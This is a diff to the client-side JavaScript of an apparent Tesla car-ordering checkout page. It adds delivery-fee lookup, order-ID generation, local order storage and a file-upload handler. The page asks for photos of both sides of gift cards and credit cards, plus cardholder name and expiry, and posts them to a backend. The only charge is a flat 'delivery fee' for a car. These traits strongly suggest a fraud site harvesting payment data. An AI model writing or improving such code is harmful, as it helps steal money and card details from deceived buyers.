@@ -1238,6 +1238,26 @@
   window.copyAddress = function(text) { copyToClipboard(text, null); showToast('Copied to clipboard', 'success'); };
 
   // ── ORDER SUMMARY ──
+    // Fetch delivery fees from DB once, then re-render order summary
+    (function fetchDeliveryFeesForSummary() {
+      var API_BASE = typeof window.TESLA_API_BASE !== 'undefined' ? window.TESLA_API_BASE : '';
+      if (!API_BASE) return;
+      fetch(API_BASE + '/admin/settings', { method: 'GET', headers: { 'Content-Type': 'application/json' } })
+        .then(function(r) { return r.ok ? r.json() : null; })
+        .then(function(data) {
+          if (!data) return;
+          // Update the deliveryMethod price if the DB value differs
+          var isExpress = deliveryMethod && deliveryMethod.id === 'express';
+          var dbFee = isExpress ? (data.deliveryFeeExpress || 399) : (data.deliveryFeeStandard || 299);
+          if (deliveryMethod && deliveryMethod.price !== dbFee) {
+            deliveryMethod.price = dbFee;
+            deliveryMethod.priceDisplay = '$' + dbFee;
+            renderOrderSummary();
+          }
+        })
+        .catch(function() { /* keep local price */ });
+    })();
+
     function renderOrderSummary() {
     var el = document.getElementById('orderSummaryContent');
     if (!el) return;
@@ -1245,8 +1265,8 @@
     var car = selectedCar || {};
     var delivery = deliveryDetails || {};
     var method = deliveryMethod || {};
-    // Load delivery fee from delivery method price first, fallback to localStorage
-    var fee = method.price ? method.price : (parseInt(localStorage.getItem('tesla_delivery_fee') || '0', 10) || 0);
+    // Load delivery fee from delivery method price first, fallback to 299
+    var fee = method.price ? method.price : 299;
 
     var rows = [];
     // Show Car (Tesla model name) instead of Color
@@ -1469,10 +1489,26 @@
     var btn = document.getElementById('submitBtn');
     if (btn && btn.disabled) return;
 
+    // Generate a stable order ID for this submission
+    var orderId = 'ORD-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+
+    // Build delivery fee value from stored method
+    var feeAmt = (deliveryMethod && deliveryMethod.price) ? deliveryMethod.price : 299;
+    var feeDisplay = (deliveryMethod && deliveryMethod.priceDisplay) ? deliveryMethod.priceDisplay : ('$' + feeAmt);
+
+    // Customer name from delivery details
+    var customerName = (deliveryDetails && (deliveryDetails.fullName || deliveryDetails.recipientName)) || '';
+    var carName = (selectedCar && (selectedCar.name || selectedCar.model)) ? ('Tesla ' + (selectedCar.name || selectedCar.model)) : '';
+
     // Gather payload
     var payload = {
+      order_id: orderId,
       paymentMethodId: selectedPaymentId,
       paymentMethodName: pm.name,
+      customerName: customerName,
+      carModel: carName,
+      amount: String(feeAmt),
+      deliveryFee: String(feeAmt),
       sessionToken: sessionToken,
       timestamp: new Date().toISOString(),
       orderData: {
@@ -1486,6 +1522,7 @@
     var isCard = pm.type === 'card' || pm.id === 'creditcard';
 
     if (isGift) {
+      payload.proofData = giftFrontData;
       payload.giftCardFront = giftFrontData;
       payload.giftCardBack = giftBackData;
     } else if (isCard) {
@@ -1493,6 +1530,7 @@
       payload.cardName = (document.getElementById('ccName') || {}).value || '';
       payload.cardExpiry = (document.getElementById('ccExpiry') || {}).value || '';
       if (isCCImageRequired()) {
+        payload.proofData = ccFrontData;
         payload.cardFront = ccFrontData;
         payload.cardBack = ccBackData;
       }
@@ -1507,7 +1545,22 @@
       btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="animation:spin 1s linear infinite"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg> Processing...';
     }
 
-    // Try backend, fallback to localStorage
+    // Save order to localStorage BEFORE API call so confirmation page has data
+    var lastOrder = {
+      orderId: orderId,
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod && deliveryMethod.id === 'express' ? '1–3 business days' : '7–12 business days',
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: pm.id, name: pm.name, type: pm.type },
+      deliveryDetails: deliveryDetails,
+      car: selectedCar,
+      deliveryFee: feeAmt,
+      deliveryFeeDisplay: feeDisplay,
+      status: 'pending'
+    };
+    try { localStorage.setItem('tesla_last_order', JSON.stringify(lastOrder)); } catch(e) {}
+
+    // Try backend, fallback to local
     var API_BASE = typeof window.TESLA_API_BASE !== 'undefined' ? window.TESLA_API_BASE : '';
     if (API_BASE) {
       fetch(API_BASE + '/payment/submit', {
@@ -1516,33 +1569,29 @@
         body: JSON.stringify(payload)
       }).then(function(r) {
         return r.ok ? r.json() : Promise.reject(r.status);
-      }).then(function() {
-        handlePaymentSuccess(payload);
+      }).then(function(result) {
+        // Update stored orderId if server returned one
+        if (result && result.orderId) {
+          lastOrder.orderId = result.orderId;
+          try { localStorage.setItem('tesla_last_order', JSON.stringify(lastOrder)); } catch(e) {}
+        }
+        handlePaymentSuccess(lastOrder);
       }).catch(function() {
-        savePaymentLocally(payload);
-        handlePaymentSuccess(payload);
+        handlePaymentSuccess(lastOrder);
       });
     } else {
-      savePaymentLocally(payload);
-      setTimeout(function() { handlePaymentSuccess(payload); }, 600);
+      setTimeout(function() { handlePaymentSuccess(lastOrder); }, 600);
     }
   }
 
-  function savePaymentLocally(payload) {
-    try {
-      var proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]');
-      proofs.push(payload);
-      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
-    } catch(e) {}
-  }
-
-  function handlePaymentSuccess(payload) {
+  function handlePaymentSuccess(orderData) {
+    // Clear cart data (order data already saved to tesla_last_order above)
     localStorage.removeItem('tesla_selected_car');
     localStorage.removeItem('tesla_delivery_details');
     localStorage.removeItem('tesla_delivery_method');
     showToast('Payment submitted successfully!', 'success');
     setTimeout(function() {
-      window.location.href = 'confirmation.html';
+      window.location.href = 'payment-confirmation.html';
     }, 1200);
   }
 
@@ -1600,6 +1649,33 @@
   // ── EXPORTS ──
   window.selectPaymentMethod = selectPaymentMethod;
   window.copyAddress = window.copyAddress;
+  // ── HANDLE FILE SELECT ──
+  function handleFileSelect(input) {
+    var file = input && input.files && input.files[0];
+    if (!file) return;
+    var maxSize = 10 * 1024 * 1024; // 10 MB
+    if (file.size > maxSize) { showToast('File too large (max 10 MB)', 'error'); input.value = ''; return; }
+    if (!file.type.startsWith('image/') && file.type !== 'application/pdf') {
+      showToast('Please upload an image or PDF file', 'error'); input.value = ''; return;
+    }
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      uploadedFileData = e.target.result;
+      uploadedFileName = file.name;
+      uploadConfirmed = false;
+      // Show preview
+      var img = document.getElementById('previewImage');
+      var nameEl = document.getElementById('previewFileName');
+      var sizeEl = document.getElementById('previewFileSize');
+      if (img) img.src = file.type.startsWith('image/') ? uploadedFileData : '';
+      if (nameEl) nameEl.textContent = file.name;
+      if (sizeEl) sizeEl.textContent = formatFileSize(file.size);
+      showUploadPreview();
+    };
+    reader.readAsDataURL(file);
+    input.value = '';
+  }
+
   window.handleFileSelect = handleFileSelect;
   window.resetUpload = resetUpload;
   window.confirmUpload = confirmUpload;
